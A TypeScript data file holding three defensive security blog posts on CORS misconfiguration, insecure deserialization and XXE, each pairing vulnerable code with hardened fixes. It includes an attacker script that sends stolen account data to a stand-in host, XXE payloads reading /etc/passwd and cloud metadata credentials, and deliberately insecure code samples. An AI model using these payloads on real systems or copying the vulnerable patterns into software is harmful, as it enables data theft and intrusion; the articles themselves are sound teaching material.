import { BlogPost } from "./blog-data";

export const trafficBatch5Articles: BlogPost[] = [
  {
    slug: "cors-misconfiguration-vulnerability-exploitation-prevention-guide",
    title: "CORS Misconfiguration: Exploitation, Examples, and Prevention Guide",
    excerpt:
      "Most CORS bugs start as a quick frontend fix, then quietly turn the browser into an attacker-controlled proxy. This article breaks down the mistakes that actually show up in production and how to tighten them without breaking the app.",
    content: `## CORS Bugs Usually Start as Convenience Fixes

CORS rarely gets weakened during a formal architecture review. It usually gets weakened on a rushed afternoon when someone needs the SPA to talk to the API, a staging domain is not on the allowlist, or a partner integration needs "temporary" access.

That is why so many real-world CORS issues look almost innocent in code review. The change is small. The header looks familiar. The app still works. Then somebody notices an authenticated endpoint can be read from a domain the business never meant to trust.

| CORS Mistake | What Happens |
|---|---|
| Wildcard origin with sensitive data | Any site can read public API responses |
| Origin reflection | Attacker-controlled sites become trusted |
| Credentials enabled for broad origins | Session-backed endpoints are exposed cross-site |
| Trusting \`.example.com\` with weak matching | Subdomain takeover can become account compromise |
| Allowing \`null\` origin | Sandboxed iframes and local files can access data |

> **Important:** CORS does not protect your API from direct server-to-server requests. It only tells browsers which origins can read responses.

---

## How CORS Actually Works

When a browser makes a cross-origin request, it includes an \`Origin\` header. The server decides whether that origin may read the response by returning headers such as:

- \`Access-Control-Allow-Origin\`
- \`Access-Control-Allow-Credentials\`
- \`Access-Control-Allow-Methods\`
- \`Access-Control-Allow-Headers\`

For non-simple requests, the browser first sends a **preflight** \`OPTIONS\` request to ask which methods and headers are allowed.

If the server gets this wrong, an attacker can host a malicious page that silently makes authenticated requests from the victim's browser.

---

## Vulnerability 1: Origin Reflection

This is the most common production issue. The backend copies whatever the browser sends in \`Origin\` and returns it as trusted.

### Vulnerable Express Example

\`\`\`javascript
app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
\`\`\`

An attacker hosts:

\`\`\`html
<script>
fetch('https://api.target.com/account', {
  credentials: 'include'
})
  .then((response) => response.text())
  .then((body) => fetch('https://evil.example/collect', {
    method: 'POST',
    body
  }));
</script>
\`\`\`

If the victim is logged in and the API reflects the malicious origin, the browser will allow the attacker page to read the sensitive response.

### Secure Pattern

\`\`\`javascript
const allowedOrigins = new Set([
  'https://app.securecodereviews.com',
  'https://dashboard.securecodereviews.com'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (origin && allowedOrigins.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  next();
});
\`\`\`

---

## Vulnerability 2: Wildcard with Credentials

Browsers block \`Access-Control-Allow-Origin: *\` when credentials are enabled, but teams still create equivalent insecure behavior through dynamic reflection or proxy logic.

### Common Anti-Pattern

\`\`\`javascript
app.use(cors({
  origin: true,
  credentials: true,
}));
\`\`\`

With many middleware stacks, \`origin: true\` means "reflect any requesting origin." That is effectively a wildcard for credentialed traffic.

### Safer Configuration

\`\`\`javascript
import cors from 'cors';

app.use(cors({
  origin: ['https://app.securecodereviews.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
\`\`\`

---

## Vulnerability 3: Broken Allowlist Matching

Many CORS filters use substring or suffix checks that attackers can bypass.

### Vulnerable Validation

\`\`\`javascript
function isTrusted(origin) {
  return origin.includes('securecodereviews.com');
}
\`\`\`

This trusts all of these attacker-controlled origins:

- \`https://securecodereviews.com.evil.example\`
- \`https://evil-securecodereviews.com\`
- \`https://securecodereviews.com@evil.example\`

### Safer Validation

\`\`\`javascript
function isTrusted(origin) {
  try {
    const url = new URL(origin);
    return url.origin === 'https://app.securecodereviews.com';
  } catch {
    return false;
  }
}
\`\`\`

If you need multiple origins, compare exact normalized origins. Do not rely on regexes unless they are extremely tight and well tested.

---

## Vulnerability 4: Trusting the \`null\` Origin

Some browsers send \`Origin: null\` for sandboxed iframes, locally opened files, and certain privacy contexts.

### Vulnerable Logic

\`\`\`javascript
if (!origin || origin === 'null') {
  res.setHeader('Access-Control-Allow-Origin', origin || '*');
}
\`\`\`

If sensitive endpoints trust \`null\`, an attacker can load a malicious payload from a local file or sandboxed frame and read authenticated responses.

### Recommendation

- Reject \`null\` for authenticated APIs.
- Only allow it if you have a very specific non-sensitive use case and have validated the business requirement.

---

## Vulnerability 5: Overly Broad Preflight Rules

Preflight responses often expose more than intended:

\`\`\`http
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
Access-Control-Allow-Headers: *
\`\`\`

This increases blast radius if an origin is mistakenly trusted. A read-only frontend probably does not need \`DELETE\`, \`PATCH\`, or custom admin headers.

### Better Approach

- Return only methods the frontend really needs.
- Return only specific headers.
- Separate public and sensitive APIs so they do not share one loose CORS policy.

---

## How to Test for CORS Vulnerabilities

### 1. Basic Reflection Check

\`\`\`bash
curl -i https://api.target.com/profile \
  -H 'Origin: https://evil.example'
\`\`\`

Look for:

- \`Access-Control-Allow-Origin: https://evil.example\`
- \`Access-Control-Allow-Credentials: true\`

That combination is a serious finding on any authenticated endpoint.

### 2. Null Origin Check

\`\`\`bash
curl -i https://api.target.com/profile \
  -H 'Origin: null'
\`\`\`

### 3. Preflight Inspection

\`\`\`bash
curl -i -X OPTIONS https://api.target.com/admin/users \
  -H 'Origin: https://app.example.com' \
  -H 'Access-Control-Request-Method: DELETE' \
  -H 'Access-Control-Request-Headers: authorization,x-admin-token'
\`\`\`

---

## Secure CORS Configuration for Next.js Route Handlers

\`\`\`typescript
import { NextRequest, NextResponse } from 'next/server';

const allowedOrigins = new Set([
  'https://app.securecodereviews.com',
]);

function applyCors(request: NextRequest, response: NextResponse) {
  const origin = request.headers.get('origin');

  if (origin && allowedOrigins.has(origin)) {
    response.headers.set('Access-Control-Allow-Origin', origin);
    response.headers.set('Access-Control-Allow-Credentials', 'true');
    response.headers.set('Access-Control-Allow-Methods', 'GET,POST');
    response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    response.headers.set('Vary', 'Origin');
  }

  return response;
}

export async function GET(request: NextRequest) {
  const response = NextResponse.json({ ok: true });
  return applyCors(request, response);
}
\`\`\`

---

## CORS Hardening Checklist

- [ ] Use exact origin allowlists, not reflection
- [ ] Never combine broad origin matching with credentials
- [ ] Reject \`null\` origin on sensitive endpoints
- [ ] Scope methods and headers tightly
- [ ] Add \`Vary: Origin\` when responses differ by origin
- [ ] Separate public APIs from authenticated APIs
- [ ] Review subdomain takeover risk before trusting wildcard subdomains
- [ ] Test preflight behavior during security reviews

## Final Takeaway

CORS misconfiguration is one of those bugs that feels "frontend-ish" right up until it exposes billing data, session-backed APIs, or admin responses. The practical fix is not complicated: be explicit about which origins you trust, be skeptical of any dynamic reflection logic, and review CORS the same way you would review an access-control rule.`,
    date: "2026-05-03",
    author: "SCRs Team",
    category: "API Security",
    tags: ["CORS", "CORS Misconfiguration", "API Security", "Security Headers", "Browser Security", "Express", "Next.js"],
    readTime: "12 min read",
  },
  {
    slug: "insecure-deserialization-attacks-object-injection-rce-guide",
    title: "Insecure Deserialization: Object Injection, Gadget Chains, and RCE Prevention",
    excerpt:
      "Unsafe deserialization looks like routine data handling until it becomes code execution. This article focuses on how these bugs actually show up in real systems, why gadget chains matter, and what teams do to remove the risk instead of just documenting it.",
    content: `## This Bug Starts as Parsing and Ends as Code Execution

Insecure deserialization is one of those vulnerabilities that gets underestimated because the triggering line of code often looks boring. Someone is loading a cookie, restoring a session blob, importing a file, or unpacking a message from another service. It reads like plumbing, not exploit surface.

The problem is that some formats do not just carry data. They rebuild objects, invoke hooks, and restore behavior. Once untrusted input can influence that process, the attacker is no longer just sending values. They are shaping execution.

| Attack Outcome | Example Impact |
|---|---|
| Remote code execution | Attacker executes system commands on the server |
| Privilege escalation | Hidden properties alter authorization state |
| Denial of service | Recursive structures exhaust memory or CPU |
| Business logic abuse | Unexpected object state bypasses validation |
| SSRF or file access | Deserialized classes make network or file calls |

> **Key principle:** If the format can reconstruct behavior-rich objects, it becomes part of your attack surface.

---

## How Deserialization Attacks Work

The attacker does not need your exact source code. They need:

1. A sink that accepts untrusted serialized data.
2. A classpath or dependency set containing dangerous gadgets.
3. A code path that deserializes before authorization or validation.

That is how simple-looking bugs become full compromise.

---

## Vulnerable Pattern 1: Python Pickle

\`\`\`python
import pickle

def load_profile(blob: bytes):
    return pickle.loads(blob)
\`\`\`

\`pickle\` is not a data format. It is a Python object reconstruction mechanism that can execute arbitrary code during loading.

### Safer Alternative

\`\`\`python
import json
from pydantic import BaseModel

class UserProfile(BaseModel):
    name: str
    role: str

def load_profile(blob: bytes) -> UserProfile:
    parsed = json.loads(blob)
    return UserProfile.model_validate(parsed)
\`\`\`

Use plain data formats plus schema validation.

---

## Vulnerable Pattern 2: Java Native Serialization

\`\`\`java
ObjectInputStream input = new ObjectInputStream(request.getInputStream());
Object data = input.readObject();
\`\`\`

If the JVM classpath contains gadget chains from common libraries, an attacker may reach RCE before your business logic even examines the object.

### Safer Option

\`\`\`java
ObjectMapper mapper = new ObjectMapper();
PaymentRequest requestBody = mapper.readValue(jsonBody, PaymentRequest.class);
validator.validate(requestBody);
\`\`\`

Prefer JSON or Protocol Buffers with explicit schemas and validation.

---

## Vulnerable Pattern 3: PHP \`unserialize\`

\`\`\`php
$cart = unserialize($_COOKIE['cart']);
\`\`\`

This can trigger magic methods like \`__wakeup()\` or \`__destruct()\` on attacker-controlled object graphs.

### Safer Option

\`\`\`php
$cart = json_decode($_COOKIE['cart'], true, 512, JSON_THROW_ON_ERROR);
if (!is_array($cart)) {
    throw new RuntimeException('Invalid cart');
}
\`\`\`

---

## Vulnerable Pattern 4: Node.js Libraries That Rehydrate Functions

JavaScript itself does not have a built-in equivalent as dangerous as Java serialization, but third-party libraries can recreate executable behavior from untrusted input.

### Example Risk

\`\`\`javascript
const serialize = require('node-serialize');

app.post('/import', (req, res) => {
  const obj = serialize.unserialize(req.body.payload);
  res.json({ ok: true, obj });
});
\`\`\`

If a library reconstructs functions or complex prototypes from attacker input, treat it as a critical finding.

### Safer Option

\`\`\`javascript
import { z } from 'zod';

const ImportSchema = z.object({
  type: z.string(),
  enabled: z.boolean(),
});

app.post('/import', (req, res) => {
  const data = ImportSchema.parse(req.body);
  res.json({ ok: true, data });
});
\`\`\`

---

## What Is a Gadget Chain?

A gadget chain is a sequence of legitimate classes or methods already present in your application dependencies. None of them look malicious in isolation. When stitched together through deserialization, they create unintended execution paths.

Typical chain flow:

1. Deserializer recreates attacker-controlled object graph.
2. Magic method, callback, or lifecycle hook fires automatically.
3. Gadget methods transform data and eventually invoke file, process, or network behavior.
4. The payload executes before business logic rejects it.

That is why "we never call that method directly" is not a defense.

---

## Common False Assumptions

### "It Is Safe Because the Data Is Base64 Encoded"

Base64 is transport encoding, not protection.

### "It Is Safe Because the Cookie Is Signed"

If attackers can obtain or forge the signing key, the exploit becomes reliable. Signed dangerous formats are still dangerous.

### "The Endpoint Is Internal"

Internal attack surface still matters. SSRF, insider threats, VPN compromise, and lateral movement routinely expose internal-only services.

---

## Production Defenses That Work

### 1. Prefer Data Formats, Not Object Formats

Use:

- JSON
- Protocol Buffers
- Avro

Avoid formats that automatically reconstruct executable object behavior unless you fully trust the producer and can strongly constrain the types.

### 2. Validate Against a Schema

Every field should be type-checked, range-checked, and semantically validated before use.

### 3. Remove Dangerous Libraries

If a library is only used for legacy convenience and supports unsafe object reconstruction, replace it. Dependency reduction is a real security control.

### 4. Apply Allowlists If Native Serialization Is Unavoidable

If a legacy Java or .NET system must deserialize native objects, restrict allowed classes aggressively and isolate that code path.

### 5. Treat Signed Blobs as Untrusted Until Parsed Safely

Authenticity does not guarantee safety.

---

## Code Review Checklist for Deserialization

Search for:

- \`pickle.loads\`
- \`yaml.load\` without safe loader
- \`ObjectInputStream\`
- \`BinaryFormatter\`
- \`unserialize\`
- Third-party libraries that reconstruct classes, functions, or prototypes

Then ask:

- Can the attacker influence this data?
- Is deserialization happening before authorization?
- What classes or gadgets are reachable?
- Can the format be replaced with JSON plus validation?

---

## Deserialization Hardening Checklist

- [ ] Replace native object serialization with plain data formats
- [ ] Validate input with strict schemas
- [ ] Remove unsafe legacy libraries
- [ ] Disable or restrict dangerous type resolution features
- [ ] Keep dependencies updated to reduce known gadget availability
- [ ] Isolate unavoidable deserialization behind narrow interfaces
- [ ] Log and alert on malformed serialized input

## Final Takeaway

The best deserialization fix is usually not a better regex, a stronger signature, or a longer review checklist. It is stepping back and removing behavior-rich serialization from untrusted paths entirely. Once teams make that architectural change, most of the scary exploit theory becomes irrelevant because the dangerous primitive is gone.`,
    date: "2026-05-03",
    author: "SCRs Team",
    category: "Application Security",
    tags: ["Insecure Deserialization", "Object Injection", "RCE", "Gadget Chains", "Secure Coding", "Python", "Java"],
    readTime: "13 min read",
  },
  {
    slug: "xxe-vulnerability-xml-external-entity-prevention-guide",
    title: "XXE Vulnerability: XML External Entity Attacks and Prevention Guide",
    excerpt:
      "XXE is still a live issue because XML keeps showing up in places teams forget to threat model. This article covers the parser behavior that causes file disclosure and SSRF, plus the hardening steps that matter in real SAML, SOAP, and document-processing code paths.",
    content: `## XXE Usually Hides in the Parts of the Stack Nobody Revisits

Very few teams ship brand-new features and announce, "we built an XML parser today." XXE usually shows up more indirectly than that. It is sitting inside a SAML library, a SOAP integration that has been running for years, an SVG upload flow, or some document-processing code nobody wants to touch because it only breaks twice a year.

That is why XXE keeps surviving into modern systems even though the bug class is well known. The XML is still there. It is just not where people expect it.

XML External Entity (XXE) attacks happen when an XML parser accepts external entities or Document Type Definitions (DTDs) from untrusted input. That lets attackers turn ordinary XML parsing into:

- Local file disclosure
- Server-Side Request Forgery (SSRF)
- Internal network scanning
- Denial of service through entity expansion

Even if your application is "mostly JSON," XXE still appears in SAML integrations, SOAP services, file uploads, office document processing, SVG handling, and third-party SDKs.

| XXE Impact | Example |
|---|---|
| File disclosure | Read \`/etc/passwd\` or app config files |
| SSRF | Reach cloud metadata endpoints or internal admin panels |
| Credential exposure | Read keys, tokens, or connection strings from local files |
| DoS | Exponential entity expansion consumes CPU and memory |

---

## Basic XXE Attack Example

### Malicious XML

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
\`\`\`

If the parser resolves external entities, the application may include local file contents in logs, responses, database records, or error messages.

---

## XXE to SSRF: The Cloud Risk

XXE is not limited to files. External entities can make network requests.

### Example Payload

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY meta SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&meta;</data>
\`\`\`

If successful against cloud workloads, this can expose instance metadata or temporary credentials.

---

## Vulnerable Java Example

\`\`\`java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);
\`\`\`

With default or weak configuration, the parser may process attacker-supplied DTDs and external entities.

### Hardened Java Configuration

\`\`\`java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);
\`\`\`

---

## Vulnerable Python Example

\`\`\`python
from lxml import etree

def parse_xml(xml_bytes: bytes):
    return etree.fromstring(xml_bytes)
\`\`\`

### Hardened Python Example

\`\`\`python
from defusedxml.lxml import fromstring

def parse_xml(xml_bytes: bytes):
    return fromstring(xml_bytes)
\`\`\`

Use hardened parser libraries where available instead of trying to remember every parser flag by hand.

---

## Vulnerable .NET Example

\`\`\`csharp
var xml = new XmlDocument();
xml.Load(stream);
\`\`\`

### Hardened .NET Example

\`\`\`csharp
var settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};

using var reader = XmlReader.Create(stream, settings);
var xml = new XmlDocument {
    XmlResolver = null
};
xml.Load(reader);
\`\`\`

---

## Why XXE Keeps Slipping Through Reviews

### 1. Developers Assume XML Is Just Data

XML can instruct parsers to fetch external resources. That makes it more dangerous than plain text formats.

### 2. The XML Is Hidden Inside Other Formats

Common examples:

- SVG uploads
- SOAP requests
- SAML assertions
- DOCX, XLSX, and other zipped XML-based formats

### 3. Secure Defaults Differ Across Libraries

One parser may disable DTDs by default, while another quietly allows them. Teams often copy examples without checking security flags.

---

## How to Test for XXE

### File Read Probe

\`\`\`xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<foo>&xxe;</foo>
\`\`\`

### SSRF Probe

\`\`\`xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://collaborator.example/xxe">]>
<foo>&xxe;</foo>
\`\`\`

### DoS Probe

Use a safe test environment only. Entity expansion payloads can destabilize services quickly.

---

## Best Practices for XXE Prevention

### Prefer JSON When Possible

If you control the protocol, JSON removes an entire parser-risk category.

### Disable DTDs and External Entities

This is the primary defense for XML parsers.

### Use Hardened Libraries

Libraries such as \`defusedxml\` exist for a reason. Use them.

### Restrict Outbound Network Access

If XXE does occur, network egress controls can limit SSRF impact.

### Review Indirect XML Inputs

Do not focus only on explicit \`.xml\` endpoints. Look at document imports, SSO flows, and image handling.

---

## XXE Hardening Checklist

- [ ] Disable DTD processing
- [ ] Disable external general entities
- [ ] Disable external parameter entities
- [ ] Disable external DTD loading
- [ ] Use hardened XML parser libraries
- [ ] Prefer JSON for new integrations
- [ ] Restrict outbound network egress from parser workloads
- [ ] Add tests for malicious XML samples in CI

## Final Takeaway

XXE is not an obscure parser edge case. It is a reminder that input formats can carry behavior, not just structure. The teams that avoid it consistently do two things well: they know exactly where XML still enters the stack, and they lock those code paths down instead of assuming a library default will stay safe forever.`,
    date: "2026-05-03",
    author: "SCRs Team",
    category: "Application Security",
    tags: ["XXE", "XML External Entity", "SSRF", "XML Security", "Java", "Python", "SAML"],
    readTime: "12 min read",
  },
];